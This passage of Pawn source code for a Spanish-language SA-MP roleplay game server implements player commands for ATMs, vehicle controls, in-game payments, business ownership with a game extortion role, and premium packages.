		if(IsPlayerInRangeOfPoint(playerid, 2.0, cajeros[i][cajeroPos][0], cajeros[i][cajeroPos][1], cajeros[i][cajeroPos][2]))
		{
			if(cajeros[i][cajeroUse])return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF}Este cajero esta siendo usado.");
			enteroChar[cajeroslot]{playerid} = i;
			ShowPlayerDialog(playerid, DIALOGO_CAJERO, DIALOG_STYLE_INPUT, "ATM - Tu banco, tu seguro!", "{ffffff}Ingrese el número de su tarjeta de débito en el panel del cajero.\n{ffffff}Ejemplo: {ff0000}123456789", "Aceptar", "Salir");
			return 1;
		}
	}
	return 1;
}
COMMAND:vehiculo(playerid, params[])
{
	Mensaje(playerid, COLOR_GRIS, "Comandos Vehiculares: /vluces /vcapo /vseguro /vestacionar /vmaletero /ven");
	return 1;
}
COMMAND:ejectar(playerid, params[])
{
	new string[126], jugador;
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)return Mensaje(playerid, COLOR_GRIS2, "No eres coductor.");
	if(sscanf(params, "u", jugador))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /ejectar [Usuario]");
	
	new vehicle = GetPlayerVehicleID(playerid);
	if(IsPlayerInAnyVehicle(jugador) && GetPlayerVehicleID(jugador) == vehicle)
	{
		format(string, sizeof(string), "* %s agarra fuertemente a %s y lo expulsa del vehículo.", PlayerName(playerid), PlayerName(jugador));
		ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
		RemovePlayerFromVehicle(jugador);
	}else Mensaje(playerid, COLOR_GRIS2, "No esta en este vehiculo.");
	return 1;
}
COMMAND:papeles(playerid, params[])
{
	new jugador, llave, vehicle;
	if(sscanf(params, "ud", jugador, llave))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /papeles [Usuario][Slot 1-4]");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado.");
	if(dDistanciaJugador(8.0, playerid, jugador))
	{
		switch(llave)
		{
			case 1: vehicle = cuenta[playerid][cCoche];
			case 2: vehicle = cuenta[playerid][cCoche2];
			case 3: vehicle = cuenta[playerid][cCoche3];
			case 4: vehicle = cuenta[playerid][cCoche4];
			default: Mensaje(playerid, COLOR_ROJO, "Utiliza: /papeles [Usuario][Slot 1 - 4]");
		}
		if(!vehicle)return Mensaje(playerid, COLOR_GRIS, "Usted no posee un vehiculo en este slot.");
		if(llave >= 1 || llave <= 4 && vehicle)
		{
			new string[126];
			format(string, sizeof(string), "|_______%s_______|", PlayerName(playerid));
			Mensaje(jugador, COLOR_AMARILLO2, string);
			format(string, sizeof(string), "Modelo: %s  - Matrícula: %s", autos[vehicle][cName], autos[vehicle][cPlate]);
			Mensaje(jugador, COLOR_BLANCO, string);
			format(string, sizeof(string), "Embargos: %d -  Multa: %d$", autos[vehicle][cEmbargo], autos[vehicle][cMulta]);
			Mensaje(jugador, COLOR_BLANCO, string);
			
			format(string, sizeof(string), "* %s le muestra a %s los documentos del vehículo.", PlayerName(playerid), PlayerName(jugador));
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
		}
	}else Mensaje(playerid, COLOR_GRIS2, "Este jugador esta lejos.");  
	return 1;
}
COMMAND:vluces(playerid, params[])
{
	if(IsPlayerInAnyVehicle(playerid))
	{
		new vehicle = GetPlayerVehicleID(playerid);
		new engine, lights, alarm, doors, bonnet, boot, objective;
		GetVehicleParamsEx(vehicle, engine, lights, alarm, doors, bonnet, boot, objective);
		if(!cLuces[vehicle])
		{
			cLuces[vehicle] = true;
			SetVehicleParamsEx(vehicle, engine, cLuces[vehicle], alarm, doors, bonnet, boot, objective);
		}
		else if(cLuces[vehicle])
		{
			cLuces[vehicle] = false;
			SetVehicleParamsEx(vehicle, engine, cLuces[vehicle], alarm, doors, bonnet, boot, objective);
		}
	}
	return 1;
}
COMMAND:vcapo(playerid, params[])
{
	if(IsPlayerInAnyVehicle(playerid))
	{
		new vehicle = GetPlayerVehicleID(playerid);
		new engine, lights, alarm, doors, bonnet, boot, objective;
		GetVehicleParamsEx(vehicle, engine, lights, alarm, doors, bonnet, boot, objective);
		if(!cCapo[vehicle])
		{
			cCapo[vehicle] = true;
			SetVehicleParamsEx(vehicle, engine, lights, alarm, doors, cCapo[vehicle], boot, objective);
		}
		else if(cCapo[vehicle])
		{
			cCapo[vehicle] = false;
			SetVehicleParamsEx(vehicle, engine, lights, alarm, doors, cCapo[vehicle], boot, objective);
		}
	}
	return 1;
}
COMMAND:vestacionar(playerid, params[])
{
	if(EsZonaPrivada(playerid))return Mensaje(playerid, COLOR_ROJO, "No puedes estacionar en una zona publica!");
	if(IsPlayerInAnyVehicle(playerid))
	{
		new vehicle = GetPlayerVehicleID(playerid);
		if(LlaveVehicular(playerid, vehicle))
		{
			EstacionarAuto(playerid, vehicle);
		}else return Mensaje(playerid, COLOR_GRIS2, "Este coche no le pertenece.");
	}
	return 1;
}
COMMAND:llenar(playerid, params[])
{
	if(IsAtGasStation(playerid))
	{
		llenarAuto(playerid);
	}else Mensaje(playerid, COLOR_ROJO, "No estás en una estación de gasolina.");
	return 1;
}
COMMAND:pcu(playerid, params[])
{
	if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No estás en un vehículo.");
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		SetTimerEx("vehiculoExamen", 3000, false, "i", playerid);
		Mensaje(playerid, -1, "* {4C9CB6}Prendiendo PCU del Vehiculo...");
	}else Mensaje(playerid, COLOR_ROJO, "No eres el conductor.");
	return 1;
}
COMMAND:motor(playerid)
{
	encenderAuto(playerid);
	return 1;
}
COMMAND:vseguro(playerid, params[])
{
	new Float:interno_pos[3], llave, vehicle, string[126];
	if(sscanf(params, "d", llave))return Mensaje(playerid, COLOR_ROJO, "Utiliza: /vseguro [slot 1 - 4]");
	switch(llave)
	{
		case 1: vehicle = cuenta[playerid][cCoche];
		case 2: vehicle = cuenta[playerid][cCoche2];
		case 3: vehicle = cuenta[playerid][cCoche3];
		case 4: vehicle = cuenta[playerid][cCoche4];
		default: Mensaje(playerid, COLOR_ROJO, "Utiliza: /vseguro [slot 1 - 4]");
	}
	if(!vehicle)return Mensaje(playerid, COLOR_GRIS, "Usted no posee un vehiculo en este slot.");
	if(llave >= 1 || llave <= 4 && vehicle)
	{
		GetVehiclePos(vehicle, interno_pos[0], interno_pos[1], interno_pos[2]);
		if(!IsPlayerInRangeOfPoint(playerid, 20.0, interno_pos[0], interno_pos[1], interno_pos[2]))return Mensaje(playerid, COLOR_GRIS2, "No hay señal.");
		if(!autos[vehicle][cLock])
		{
			autos[vehicle][cLock] = true;
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(vehicle, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vehicle, engine, lights, alarm, autos[vehicle][cLock], bonnet, boot, objective);
			GameTextForPlayer(playerid, "~w~vehiculo ~r~cerrado", 3000, 3);
			ProxDetector(30.0, playerid, "* ¡Bip Bip!  (Vehículo Cerrado) *", 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF);
			format(string, sizeof(string), "* %s cierra con seguro su %s.", PlayerName(playerid), autos[vehicle][cName]);
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
		}
		else if(autos[vehicle][cLock])
		{			
			autos[vehicle][cLock] = false;
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(vehicle, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vehicle, engine, lights, alarm, autos[vehicle][cLock], bonnet, boot, objective);
			GameTextForPlayer(playerid, "~w~vehiculo ~g~abierto", 3000, 3);
			ProxDetector(30.0, playerid, "* Bip Bip!  (Vehículo Abierto) *", 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF);
			format(string, sizeof(string), "* %s abre su %s.", PlayerName(playerid), autos[vehicle][cName]);
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
		}
	}
	return 1;
}
COMMAND:ven(playerid, params[])
{
	if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_GRIS2, "No estas dentro de un auto.");
	new string[126], vehicle = GetPlayerVehicleID(playerid);
	if(EsAuto(vehicle))
	{
		if(!autoVentana{vehicle})
		{
			autoVentana{vehicle} = true;
			format(string, sizeof(string), "* %s baja la ventana.", PlayerName(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
		}
		else if(autoVentana{vehicle})
		{
			autoVentana{vehicle} = false;
			format(string, sizeof(string), "* %s sube la ventana.", PlayerName(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
		}
	}
	return 1;
}

#if defined NAVIDAD
//regalo
COMMAND:regalo(playerid, params[]){
	if(IsPlayerInRangeOfPoint(playerid, 5.0, 1480.0016, -1669.4573, 14.5532)){
		new string[128], year, mes, dia;
		getdate(year, mes, dia);

		if(cuenta[playerid][cNivel] < 3)return Mensaje(playerid, COLOR_ROJO, "Usted debe ser nivel 3 para usar este comando.");
		if(cuenta[playerid][cNavidad] == dia)return Mensaje(playerid, COLOR_ROJO, "Usted ya recogio su regalo hoy.");
		Mensaje(playerid, -1, "{FFA500}Center Island RolePlay{FFFFFF} te desea Felices Fiestas.");
		Mensaje(playerid, -1, "{00FFFF}Gracias por estar con nosotros este 2014.");
		new Dinero = dia * 300, Moneda = dia * 6;

		ganaDinero(playerid, Dinero);
		cuenta[playerid][cMonedas] += Moneda;

		format(string, sizeof(string), "Regalo N° 1: Dinero {00FF00}%d$", Dinero);
		Mensaje(playerid, -1, string);
		format(string, sizeof(string), "Regalo N° 2: Monedas {FFFF00}%d", Moneda);
		Mensaje(playerid, -1, string);

		cuenta[playerid][cNavidad] = dia;
	}
	return 1;
}
#endif
COMMAND:iphone(playerid, params[])
{
	new string[126], segs, mins, hors;
	
	gettime(hors, mins, segs);
	
	format(string, sizeof(string), "%02d:%02d", hors, mins);
	TextDrawSetString(iPhoneGlobalTextdraw[9], string);
	
	PlayerTextDrawSetString(playerid, iPhonewifi[playerid], SenalWifi(playerid) ? ("~g~~h~~h~WIFI               ~w~Movistar"):("~r~WIFI               ~w~Movistar"));
	
	for(new global; global < sizeof(iPhoneGlobalTextdraw); global++)
	{
		TextDrawShowForPlayer(playerid, iPhoneGlobalTextdraw[global]);
	}
	for(new player; player < sizeof(iPhoneDatos); player++)
	{
		PlayerTextDrawShow(playerid, iPhoneDatos[player][TDIphone]);
	}
	
	PlayerTextDrawShow(playerid, iPhonewifi[playerid]);

	SelectTextDraw(playerid, COLOR_LIMA);
	booleano[_EstadoIphone]{playerid} = true;
	return 1;
}
/*Comando del catalogo*/
COMMAND:pagar(playerid, params[])
{
	new player, dinero, string[128];
	if(sscanf(params, "ui", player, dinero))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /pagar (Jugador/ID) (Cantidad)");
	if(dinero > obtenerDinero(playerid))return Mensaje(playerid, COLOR_GRIS2, "No posees esa cantidad.");
	if(dinero < 1 || dinero > 3000)return Mensaje(playerid, COLOR_GRIS2, "Máx: 3000$");
	if(booleano[AdminDuty]{player})return Mensaje(playerid, COLOR_ROJO, "Administrador en Servicio.");
	if(IsPlayerConnected(player))
	{
		if(dDistanciaJugador(5.0, playerid, player))
		{
			enteroChar[nPagarContador]{playerid}++;
			if(enteroChar[nPagarContador]{playerid} == 2)
			{
				format(string, sizeof(string), "{FF0000}Anti-Cheat{FFFFFF}: Posible Multicuenta (Pase de Dinero) %s[%d].", Nombre(playerid), playerid);
				MensajeAdmin2(-1, string, 1);
			}

			pierdeDinero(playerid, dinero);
			ganaDinero(player, dinero);
			format(string, sizeof(string), "* %s saca su billetera y paga %d$ a %s", PlayerName(playerid), dinero, PlayerName(player));
			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
		}else Mensaje(playerid, COLOR_GRIS2, "Jugador muy lejos.");
	}else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
	return 1;
}
//Negocios
COMMAND:vendernegocio(playerid, params[])
{
	new neg, idneg;
	if(sscanf(params, "d", neg))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /vendernegocio [slot 1 - 2]");
	switch(neg)
	{
		case 1:
		{
			idneg = cuenta[playerid][cNegocio];
			if(idneg == 9999)return Mensaje(playerid, COLOR_ROJO, "No tienes un negocio.");
			if(IsPlayerInRangeOfPoint(playerid, 3.0, negocio[idneg][bEntrancex], negocio[idneg][bEntrancey], negocio[idneg][bEntrancez]))
			{
				entero[playerid][sNegocio] = neg;
				ShowPlayerDialog(playerid, Dialog_NegocioSell, DIALOG_STYLE_MSGBOX, "Vender Negocio", "{ffffff}Estas a punto de vender tu negocio a un {ff0000}40% {ffffff}del valor por el cual lo compraste\n\n{ffffff}esta seguro de quererlo vender?", "Aceptar", "Cancelar");
			}else Mensaje(playerid, COLOR_ROJO, "Debes estar cerca de tu negocio para venderlo!");
		}
		case 2:
		{
			idneg = cuenta[playerid][cNegocio2];
			if(idneg == 9999)return Mensaje(playerid, COLOR_ROJO, "No tienes un negocio.");
			if(IsPlayerInRangeOfPoint(playerid, 3.0, negocio[idneg][bEntrancex], negocio[idneg][bEntrancey], negocio[idneg][bEntrancez]))
			{
				entero[playerid][sNegocio] = neg;
				ShowPlayerDialog(playerid, Dialog_NegocioSell, DIALOG_STYLE_MSGBOX, "Vender Negocio", "{ffffff}Estas a punto de vender tu negocio a un {ff0000}40% {ffffff}del valor por el cual lo compraste\n\n{ffffff}esta seguro de quererlo vender?", "Aceptar", "Cancelar");
			}else Mensaje(playerid, COLOR_ROJO, "Debes estar cerca de tu negocio para vernderlo!");
		}
		default: Mensaje(playerid, COLOR_GRIS2, "Utiliza: /vendernegocio [1 - 2]");
	}
	return 1;
}
/*COMMAND:ccjugador(playerid, params[])
{
	new pass[32], string[144];
	if(sscanf(params, "s[32]", pass))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /ccjugador [Contraseña]");
	if(strlen(pass) < 4 || strlen(pass) > 24)return Mensaje(playerid, COLOR_GRIS2, "Su clave debe ser mayor a 5 caracteres y menor a 24.");
	
	format(cuenta[playerid][cAcceso], 24, "%s", pass);
	MySQL_UPDATE_STRING("zz_usuarios", Nombre(playerid), "clave", pass);
	
	format(string, sizeof(string), "Su contraseña cambio a: %s", pass);
	Mensaje(playerid, COLOR_VERDE, string);
	return 1;
}*/
COMMAND:ccadmin(playerid, params[])
{
	new pass[32], string[144];
	if(!cuenta[playerid][cAdministrador])return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(sscanf(params, "s[32]", pass))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /ccadmin [Contraseña]");
	if(strlen(pass) < 4 || strlen(pass) > 24)return Mensaje(playerid, COLOR_GRIS2, "Su clave debe ser mayor a 5 caracteres y menor a 24.");
	
	format( cuenta[playerid][cAcceso2], 24, "%s", pass);
	MySQL_UPDATE_STRING("zz_usuarios", Nombre(playerid), "clave2", pass);
	
	format(string, sizeof(string), "Su contraseña administrativa cambio a: %s", pass);
	Mensaje(playerid, COLOR_VERDE, string);
	return 1;
}
COMMAND:comprarnegocio(playerid, params[])
{
	new string[128];
	for(new b=0;b<sizeof(negocio);b++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 2.0, negocio[b][bEntrancex], negocio[b][bEntrancey], negocio[b][bEntrancez]))
		{
			if(negocio[b][bOwned])return Mensaje(playerid, COLOR_ROJO, "Este negocio ya tiene dueño!");
			if(cuenta[playerid][cNivel] < negocio[b][bLevelNeeded])
			{
				format(string, sizeof(string), "Este negocio requiere que seas nivel %d", negocio[b][bLevelNeeded]);
				Mensaje(playerid, COLOR_ROJO, string);
				return 1;
			}
			if(obtenerDinero(playerid) >= negocio[b][bBuyPrice])
			{
			
				if(cuenta[playerid][cNegocio] == 9999) cuenta[playerid][cNegocio] = b;
				else if(cuenta[playerid][cNegocio2] == 9999 && cuenta[playerid][cDonador] >= 4) cuenta[playerid][cNegocio2] = b;
				else return Mensaje(playerid, COLOR_ROJO, "Usted no puede tener mas negocios.");
				
				//ZZCASH
				switch(cuenta[playerid][cDonador])
				{
					case 1: pierdeDinero(playerid, negocio[b][bBuyPrice] - negocio[b][bBuyPrice] * 2 / 100);
					case 2: pierdeDinero(playerid, negocio[b][bBuyPrice] - negocio[b][bBuyPrice] * 3 / 100);
					case 3: pierdeDinero(playerid, negocio[b][bBuyPrice] - negocio[b][bBuyPrice] * 3 / 100);
					case 4: pierdeDinero(playerid, negocio[b][bBuyPrice] - negocio[b][bBuyPrice] * 8 / 100);
					default: pierdeDinero(playerid, negocio[b][bBuyPrice]);
				}
				
				negocio[b][bOwned] = 1;
				format(negocio[b][bOwner], 24, "%s", Nombre(playerid));
				Mensaje(playerid, COLOR_BLANCO, "Felicidades, has adquirido este negocio. Utiliza /ayuda negocio");
				Mensaje(playerid, COLOR_BLANCO, "Usted tiene 25 dias pagos de impuesto.");
				negocio[b][bcostenter] = 50;
				negocio[b][bProduc] = 100;
				negocio[b][bTime] = gettime() + 2160000;
				OnBizzTextdrawUpdate(b);
				ActualizaNegocio(b);
				return 1;
			}else Mensaje(playerid, COLOR_ROJO, "No tienes los fondos necesarios para adquirir este negocio.");
		}
	}
	return 1;
}
COMMAND:costoentrada(playerid, params[])
{
	new neg, valor, string[144];
	if(sscanf(params, "dd", neg, valor))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /costoentrada [slot 1 - 2][$ entrada]");
	if(valor < 40 || valor > 150)return Mensaje(playerid, COLOR_GRIS2, "Entrada minima 40$ y maxima 150$");
	
	switch(neg)
	{
		case 1:
		{
			if(cuenta[playerid][cNegocio] == 9999)return Mensaje(playerid, COLOR_GRIS2, "Usted no posee un negocio.");
			negocio[cuenta[playerid][cNegocio]][bcostenter] = valor;
			format(string, sizeof(string), "Usted acaba de modificar el valor de entrada a %d$", valor);
			Mensaje(playerid, COLOR_VERDE, string);
		}
		case 2:
		{
			if(cuenta[playerid][cNegocio2] == 9999)return Mensaje(playerid, COLOR_GRIS2, "Usted no posee un negocio.");
			negocio[cuenta[playerid][cNegocio2]][bcostenter] = valor;
			format(string, sizeof(string), "Usted acaba de modificar el valor de entrada a %d$", valor);
			Mensaje(playerid, COLOR_VERDE, string);
		}
		default: Mensaje(playerid, COLOR_GRIS2, "Utiliza: /costoentrada [slot 1 - 2][$ entrada]");
	}
	return 1;
}
COMMAND:comprarproductos(playerid, params[])
{
	new neg, valor, string[144];
	if(sscanf(params, "dd", neg, valor))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /comprarproductos [slot 1 - 2][cantidad]");
	if(valor < 1 || valor > 1000)return Mensaje(playerid, COLOR_GRIS2, "El valor por cada producto es de 40$");
	new total = valor * 40;
	if(obtenerDinero(playerid) < total)return Mensaje(playerid, COLOR_GRIS2, "Usted no tiene suficiente dinero para comprar esta cantidad.");
	
	switch(neg)
	{
		case 1:
		{
			if(cuenta[playerid][cNegocio] == 9999)return Mensaje(playerid, COLOR_GRIS2, "Usted no posee un negocio.");
			negocio[cuenta[playerid][cNegocio]][bProduc] += valor;
			pierdeDinero(playerid, total);
			format(string, sizeof(string), "Usted acaba de ordenar %d productos por un valor de %d$", valor, total);
			Mensaje(playerid, COLOR_VERDE, string);
		}
		case 2:
		{
			if(cuenta[playerid][cNegocio2] == 9999)return Mensaje(playerid, COLOR_GRIS2, "Usted no posee un negocio.");
			negocio[cuenta[playerid][cNegocio2]][bProduc] += valor;
			pierdeDinero(playerid, total);
			format(string, sizeof(string), "Usted acaba de ordenar %d productos por un valor de %d$", valor, total);
			Mensaje(playerid, COLOR_VERDE, string);
		}
		default: Mensaje(playerid, COLOR_GRIS2, "Utiliza: /comprarproductos [slot 1 - 2][$ entrada]");
	}
	return 1;
}
COMMAND:sganancias(playerid, params[])
{
	new neg, cantidad, idneg, string[126];
	if(sscanf(params, "dd", neg, cantidad))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /sganancias [slot 1 - 2][cantidad $]");
	if(cantidad < 1 || cantidad > 100000)return Mensaje(playerid, COLOR_GRIS2, "El minimo valor que puede sacar es 1$ maximo 100.000$");
	idneg = (neg == 1) ? cuenta[playerid][cNegocio] : cuenta[playerid][cNegocio2];
	
	if(idneg == 9999)return Mensaje(playerid, COLOR_ROJO, "No tienes un negocio.");
	if(IsPlayerInRangeOfPoint(playerid, 3.0, negocio[idneg][bEntrancex], negocio[idneg][bEntrancey], negocio[idneg][bEntrancez]))
	{
		if(negocio[idneg][bTill] < cantidad)return Mensaje(playerid, COLOR_GRIS2, "Usted no tiene tanto dinero.");
		ganaDinero(playerid, cantidad);
		format(string, sizeof(string), "Has retirado %d$ de la caja fuerte de tu negocio.", cantidad);
		Mensaje(playerid, COLOR_GRAD4, string);
		negocio[idneg][bTill] -= cantidad;
	}else Mensaje(playerid, COLOR_GRAD4, "Debes estar cerca de tu negocio para retirar dinero.");
	return 1;
}
COMMAND:negocio(playerid, params[])
{
	new neg, idneg, str[12], string[126];
	if(sscanf(params, "ds[12]p< >s[24]", neg, str, string))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /negocio [slot 1 - 2] [ubicacion - nombre] [Texto]");
	
	idneg = (neg == 1) ? cuenta[playerid][cNegocio] : cuenta[playerid][cNegocio2];
	if(idneg == 9999)return Mensaje(playerid, COLOR_ROJO, "No tienes un negocio!");

	if(!strcmp("ubicacion", str))
	{
		format(negocio[idneg][bUbicacion], 24, "%s", string);
		Mensaje(playerid, COLOR_VERDE, "Usted ha cambiado la direccion de su negocio.");
		OnBizzTextdrawUpdate(idneg);
	}
	else if(!strcmp("nombre", str))
	{
		format(negocio[idneg][bEmpresa], 24, "%s", string);
		Mensaje(playerid, COLOR_VERDE, "Usted ha cambiado el nombre de su negocio.");
		OnBizzTextdrawUpdate(idneg);
	}
	return 1;
}
COMMAND:extorcion(playerid, params[])
{
	new jugador, neg, idneg, string[126];
	if(!sscanf(params, "du", neg, jugador))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /extorcion [slot 1 - 2] [Usuario]");
	
	idneg = (neg == 1) ? cuenta[playerid][cNegocio] : cuenta[playerid][cNegocio2];
	if(idneg == 9999)return Mensaje(playerid, COLOR_ROJO, "No tienes un negocio!");
	
	if(IsPlayerInRangeOfPoint(playerid, 4.0, negocio[idneg][bEntrancex], negocio[idneg][bEntrancey], negocio[idneg][bEntrancez]))
	{
		if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		if(jugador == playerid)return Mensaje(playerid, COLOR_GRIS2, "No te puedes poner como extorcionista tu mismo.");
		
		if(dDistanciaJugador(5.0, playerid, jugador))
		{
			if(!strcmp("Sin Extorsionista", negocio[idneg][bExtortion]))
			{
				format(negocio[idneg][bExtortion], 24, "%s", PlayerName(jugador));
				format(string, sizeof(string), "Desde ahora {FF4FD4}%s {FFFFFF}será el extorcionista de tu negocio.", PlayerName(jugador));
				Mensaje(playerid, COLOR_BLANCO, string);
				format(string, sizeof(string), "%s te ha puesto como extorcionista de su negocio, ahora puedes usar {FF4FD4}/recaudar.", PlayerName(playerid));
				Mensaje(jugador, COLOR_BLANCO, string);
				OnBizzTextdrawUpdate(idneg);
			}else Mensaje(playerid, COLOR_GRIS2, "Tu negocio ya tiene un extorcionista, primero usa /qextorcion.");
		}else Mensaje(playerid, COLOR_GRIS2, "Jugador muy lejos.");
	}else Mensaje(playerid, COLOR_GRIS2, "Debes estar cerca de tu negocio!");		
	return 1;
}
COMMAND:qextorcion(playerid, params[])
{
	new jugador, neg, idneg, string[126];
	if(!sscanf(params, "du", neg, jugador))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /extorcion [slot 1 - 2] [Usuario]");
	
	idneg = (neg == 1) ? cuenta[playerid][cNegocio] : cuenta[playerid][cNegocio2];
	if(idneg == 9999)return Mensaje(playerid, COLOR_ROJO, "No tienes un negocio!");
	
	if(IsPlayerInRangeOfPoint(playerid, 4.0, negocio[idneg][bEntrancex], negocio[idneg][bEntrancey], negocio[idneg][bEntrancez]))
	{
		if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
		if(jugador == playerid)return Mensaje(playerid, COLOR_GRIS2, "No puedes usar este comando contigo mismo.");
		if(dDistanciaJugador(5.0, playerid, jugador))
		{
			if(!strcmp(PlayerName(jugador), negocio[idneg][bExtortion]))
			{
				format(string, sizeof(string), "{FFFFFF}%s ha dedicido quitarte como extorcionista de su negocio.\n\tEstas de acuerdo con esta decision?", PlayerName(playerid));
				ShowPlayerDialog(jugador, DIALOGO_QUITAR_EXTORCION, DIALOG_STYLE_MSGBOX, "Confirmacion Negocios", string, "Aceptar", "Cancelar");
				Mensaje(playerid, COLOR_GRAD4, "* La solicitud fue enviada, espera su respuesta.");
				ExtortionID[jugador] = playerid;
				QuitExtortion[jugador] = idneg;
			}else Mensaje(playerid, COLOR_GRIS2, "* Esa persona no es extorcionista de tu negocio.");
		}else Mensaje(playerid, COLOR_GRIS2, "Jugador muy lejos.");
	}else Mensaje(playerid, COLOR_GRIS2, "Debes estar cerca de tu negocio.");
	return 1;
}
COMMAND:recaudar(playerid, params[])
{
	for(new b=0;b<sizeof(negocio);b++){
		if(IsPlayerInRangeOfPoint(playerid, 2.0, negocio[b][bEntrancex], negocio[b][bEntrancey], negocio[b][bEntrancez])){
			if(!strcmp(PlayerName(playerid), negocio[b][bExtortion])){
				if(negocio[b][bTillEx] > 0)
				{
					new string[128];
					ganaDinero(playerid, negocio[b][bTillEx]);
					format(string, sizeof(string), "Has recaudado {DC092F}%d$ {FFFFFF}de este negocio del cual eres extorcionista.", negocio[b][bTillEx]);
					Mensaje(playerid, COLOR_BLANCO, string);
					negocio[b][bTillEx] = 0;
				}else Mensaje(playerid, COLOR_GRIS2, "* No hay dinero para recaudar.");
			}
		}
	}
	return 1;
}
COMMAND:paquete(playerid, params[])
{
	if(!cuenta[playerid][cPackID])
	{
		new str[12];
		if(sscanf(params, "s[12]", str))
		{
			Mensaje(playerid, COLOR_AZUL_CLARO, "Utiliza: /paquete [gold - premium]");
			Mensaje(playerid, COLOR_BLANCO, "* Paquete Premium: XP x4 - Beneficio x4 (Subsidio)");
			Mensaje(playerid, COLOR_BLANCO, "* Habilidades de Trabajo +6 Puntos");
			Mensaje(playerid, COLOR_BLANCO, "* Duracion: 5 Horas - Costo: 700 Monedas");
			Mensaje(playerid, COLOR_ROJO, "---------------------------------------------------------------");
			Mensaje(playerid, COLOR_BLANCO, "*	Paquete Gold: XP x3 - Beneficio x3 (Subsidio)");
			Mensaje(playerid, COLOR_BLANCO, "* Habilidades de Trabajo +3 Puntos");
			Mensaje(playerid, COLOR_BLANCO, "* Duracion: 5 Horas - Costo: 500 Monedas");
			return 1;
		}
		if(!strcmp("gold", str))
		{
			if(cuenta[playerid][cMonedas] >= 500)
			{
				cuenta[playerid][cMonedas] -= 500;
				cuenta[playerid][cPack] = gettime() + 18000;
				cuenta[playerid][cPackID] = 1;
				Mensaje(playerid, 0xE9BC0AFF, "Usted acaba de comprar paquete con beneficios Gold por 5 horas.");
			}else Mensaje(playerid, COLOR_GRIS2, "Usted no tiene suficientes monedas.");
		}else if(!strcmp("premium", str))
		{
			if(cuenta[playerid][cMonedas] >= 700)
			{
				cuenta[playerid][cMonedas] -= 700;
				cuenta[playerid][cPack] = gettime() + 18000;
				cuenta[playerid][cPackID] = 2;
				Mensaje(playerid, 0xE9BC0AFF, "Usted acaba de comprar paquete con beneficios Premium por 5 horas.");
			}else Mensaje(playerid, COLOR_GRIS2, "Usted no tiene suficientes monedas.");
		}
	}
	else
	{
		Mensaje(playerid, COLOR_BLANCO, (cuenta[playerid][cPackID] == 2) ?("* Paquete Premium: XP x4 - Beneficio x4 (Subsidio)"):("* Paquete Gold: XP x3 - Beneficio x3 (Subsidio)"));
		Mensaje(playerid, COLOR_BLANCO, (cuenta[playerid][cPackID] == 2) ?("* Habilidades de Trabajo +6 Puntos"):("* Habilidades de Trabajo +3 Puntos"));
		Mensaje(playerid, COLOR_BLANCO, (cuenta[playerid][cPackID] == 2) ?("* Duracion: 5 Horas - Costo: 700 Monedas"):("* Duracion: 5 Horas - Costo: 500 Monedas"));
	}
	return 1;
}
COMMAND:tirar(playerid, params[])
{
	verificarArmaHack(playerid);
	
	new weaponid = GetPlayerWeapon(playerid), string[128];
	if(ReduceTimeb[playerid] > gettime())return Mensaje(playerid, COLOR_AMARILLO2, "Este comando se utiliza cada 10 segundos.");
	if(IsPlayerConnected(playerid))
	{
		if(Team_LSPD(playerid) || Team_FBI(playerid))return Mensaje(playerid, COLOR_GRIS2, "No puedes usar este comando debido a tu faccion!");
		new opcion[8], cantidad;
